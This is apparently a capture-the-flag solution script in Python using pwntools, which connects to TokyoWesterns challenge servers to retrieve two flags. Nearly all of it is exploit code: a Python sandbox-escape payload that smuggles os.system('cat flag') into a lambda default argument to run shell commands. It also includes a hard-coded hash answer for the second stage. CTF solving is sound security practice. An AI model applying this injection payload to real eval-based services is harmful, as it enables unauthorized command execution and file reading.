#!/usr/bin/env python3
from pwn import *

'''
flag 1
'''
r = remote('pwn1.chal.ctf.westerns.tokyo', 30001)

r.sendline('lambda x = __import__("os").system("cat flag"): x')
print(r.recvline())
r.close()

'''
flag 2
'''
r = remote('pwn1.chal.ctf.westerns.tokyo', 30002)

r.sendlineafter('input sha512(flag1) >> ', '365d5a383aee6a82ad226043bf7feae5eeed6fbe34a9ef9582527b0b4b4c726637449896bd269bb5f3680971036b023a54cab866137da3bfe5a25fd94059b176')
r.recv()
r.sendline('lambda x = __import__("os").system("cat flag2"): x')
print(r.recvline())
